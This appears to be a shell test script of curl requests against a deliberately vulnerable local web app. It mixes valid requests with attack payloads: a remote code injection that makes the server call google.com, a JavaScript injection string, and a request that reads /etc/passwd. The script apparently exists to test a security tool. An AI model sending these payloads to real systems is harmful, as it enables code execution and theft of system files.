curl 'http://localhost:8080/rci/network?payload=require(%27http%27).get(%27http://google.com%27,%20function(r)\{console.log(43);\});' -H 'Connection: keep-alive' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' -H 'sec-ch-ua: "Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87"' -H 'sec-ch-ua-mobile: ?0' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-User: ?1' -H 'Sec-Fetch-Dest: document' -H 'Accept-Language: en-GB,en;q=0.9' -H 'Cookie: connect.sid=s%3AB5ME1PlT6JRmnqzI0S_KPk4JVdbd5U73.%2BAj0Eu6nUguTRn%2FHyTlhl6wYV2luH0vjN3ypKzF4pkI' --compressed
#^End

#$ Curl30 payload=k2 Pass None
curl --location 'http://localhost:8080/js-injection?payload=k2'

#$ Curl31 payload=k2%27)%3Bconsole.log(%27hacked%20by%20k2 Attack Javascript Injection
curl --location 'http://localhost:8080/js-injection?payload=k2%27)%3Bconsole.log(%27hacked%20by%20k2'

#$ Curl32 payload=ls Pass None
curl 'http://localhost:8080/rce/valid?payload=ls' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-User: ?1' -H 'Sec-Fetch-Dest: document' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7' -H 'Cookie: connect.sid=s%3A6TNOdnOT0-BWbR0h94qqYlyn3gtLkWRs.1WDOQdbmeTYmkkyBNnIxXaQTmnNL%2B4O03gTAExuWL4U' --compressed
#^End

#$ Curl33 payload=foo Pass None
curl 'http://localhost:8080/fileread/valid?payload=foo' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-User: ?1' -H 'Sec-Fetch-Dest: document' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7' -H 'Cookie: _ga=GA1.1.337566444.1572164891; language=en; welcomebanner_status=dismiss; continueCode=E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy; cookieconsent_status=dismiss; connect.sid=s%3Ah9s26vPFy6xBXcCRT0Pd1qKWcFsHMLwH.Qikp54FJ%2B%2BmAdbLwht%2BSG%2BM%2BRFxluTsEKjP%2BoV52dbI' --compressed
#^End

#$ Curl34 payload=foo Pass None
curl 'http://localhost:8080/fileread/async/valid?payload=foo' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-User: ?1' -H 'Sec-Fetch-Dest: document' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7' -H 'Cookie: _ga=GA1.1.337566444.1572164891; language=en; welcomebanner_status=dismiss; continueCode=E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy; cookieconsent_status=dismiss; connect.sid=s%3Ah9s26vPFy6xBXcCRT0Pd1qKWcFsHMLwH.Qikp54FJ%2B%2BmAdbLwht%2BSG%2BM%2BRFxluTsEKjP%2BoV52dbI' --compressed
#^End

#$ Curl35 payload=sample.txt Pass None
curl 'http://localhost:8080/filewrite/valid?payload=sample.txt' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-User: ?1' -H 'Sec-Fetch-Dest: document' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7' -H 'Cookie: _ga=GA1.1.337566444.1572164891; language=en; welcomebanner_status=dismiss; continueCode=E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy; cookieconsent_status=dismiss; connect.sid=s%3Ah9s26vPFy6xBXcCRT0Pd1qKWcFsHMLwH.Qikp54FJ%2B%2BmAdbLwht%2BSG%2BM%2BRFxluTsEKjP%2BoV52dbI' --compressed
#^End

#$ Curl36 payload=sample.txt Pass None
curl 'http://localhost:8080/filewrite/async/valid?payload=sample.txt' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-User: ?1' -H 'Sec-Fetch-Dest: document' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7' -H 'Cookie: _ga=GA1.1.337566444.1572164891; language=en; welcomebanner_status=dismiss; continueCode=E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy; cookieconsent_status=dismiss; connect.sid=s%3Ah9s26vPFy6xBXcCRT0Pd1qKWcFsHMLwH.Qikp54FJ%2B%2BmAdbLwht%2BSG%2BM%2BRFxluTsEKjP%2BoV52dbI' --compressed
#^End

#$ Curl37 payload=foo Pass None
curl 'http://localhost:8080/fileintegrity/valid?payload=foo' -H 'Connection: keep-alive' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Sec-Fetch-Site: none' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-User: ?1' -H 'Sec-Fetch-Dest: document' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7' -H 'Cookie: _ga=GA1.1.337566444.1572164891; language=en; welcomebanner_status=dismiss; continueCode=E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy; cookieconsent_status=dismiss; connect.sid=s%3Ah9s26vPFy6xBXcCRT0Pd1qKWcFsHMLwH.Qikp54FJ%2B%2BmAdbLwht%2BSG%2BM%2BRFxluTsEKjP%2BoV52dbI' --compressed
#^End

#$ Curl38 payload=foo Valid 
curl 'http://localhost:8080/fileintegrity/async/valid?payload=foo' \-H 'Connection: keep-alive' \-H 'Pragma: no-cache' \-H 'Cache-Control: no-cache' \-H 'Upgrade-Insecure-Requests: 1' \-H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36' \-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \-H 'Sec-Fetch-Site: none' \-H 'Sec-Fetch-Mode: navigate' \-H 'Sec-Fetch-User: ?1' \-H 'Sec-Fetch-Dest: document' \-H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7' \-H 'Cookie: _ga=GA1.1.337566444.1572164891; language=en; welcomebanner_status=dismiss; continueCode=E3OzQenePWoj4zk293aRX8KbBNYEAo9GL5qO1ZDwp6JyVxgQMmrlv7npKLVy; cookieconsent_status=dismiss; connect.sid=s%3Ah9s26vPFy6xBXcCRT0Pd1qKWcFsHMLwH.Qikp54FJ%2B%2BmAdbLwht%2BSG%2BM%2BRFxluTsEKjP%2BoV52dbI' \--compressed
#^End

#$ Curl39 payload=%2Fetc%2Fpasswd Pass None
curl --location 'http://localhost:8080/sendFile?payload=%2Fetc%2Fpasswd'
#^End
fi



#error reporting curls

# curl -i 'http://localhost:8080/npe'

# curl -i 'http://localhost:8080/fileread/attack?payload=sample1223.js'

# curl -i 'http://localhost:8080/arithmatic-uncaught?payload=1'

# curl -i 'http://localhost:8080/500-internal-server'

# curl -i 'http://localhost:8080/501-not-implemented'

# curl -i 'http://localhost:8080/502-bad-gateway'

# curl -i 'http://localhost:8080/503-service-unavailable'

# curl -i 'http://localhost:8080/504-gateway-timeout'

# curl -i 'http://localhost:8080/505-version-unsupported'

# curl -i 'http://localhost:8080/506-variant-negotiates'

# curl -i 'http://localhost:8080/507-insufficient-storage'

# curl -i 'http://localhost:8080/508-loop-detected'

# curl -i 'http://localhost:8080/509-bandwidth-limit-exceed'

# curl -i 'http://localhost:8080/510-not-extended'

# curl -i 'http://localhost:8080/511-auth-required'

#error reporting curls
